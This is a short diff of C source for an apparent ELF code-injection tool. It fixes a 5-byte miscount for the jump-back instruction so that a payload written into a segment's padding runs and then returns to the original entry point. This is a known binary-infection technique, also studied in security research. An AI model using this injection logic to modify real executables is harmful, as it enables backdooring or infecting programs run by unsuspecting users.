@@ -109,7 +109,7 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, char *p
 	Elf64_Addr inj_pos = (Elf64_Addr) (phdr[ph_num].p_offset + phdr[ph_num].p_filesz);
 	uint64_t entry_pos = phdr[ph_num].p_vaddr + phdr[ph_num].p_filesz;
 	// offset of virtual memory to write to
-	off_t offset = header->e_entry - (entry_pos + payload_len);
+	off_t offset = header->e_entry - (entry_pos + payload_len + 5); // 5 bytes for jump instruction
 
 	if(verbose){
 		fprintf(stderr, "\n>>>> Starting WRITE: <<<<\n\n");
@@ -135,8 +135,8 @@ void write_injection(char *target, Elf64_Ehdr *header, Elf64_Phdr *phdr, char *p
 	memcpy(target + inj_pos + payload_len, jump_back, 5);
 
 	// increasing program header file sizes
-	phdr[ph_num].p_filesz += payload_len;
-	phdr[ph_num].p_memsz += payload_len;
+	phdr[ph_num].p_filesz += payload_len + 5; // once again +5 for jmp instruction
+	phdr[ph_num].p_memsz += payload_len + 5;
 
 	if(verbose)
 		fprintf(stderr, "\nFinished injection. Exiting.\n\n");
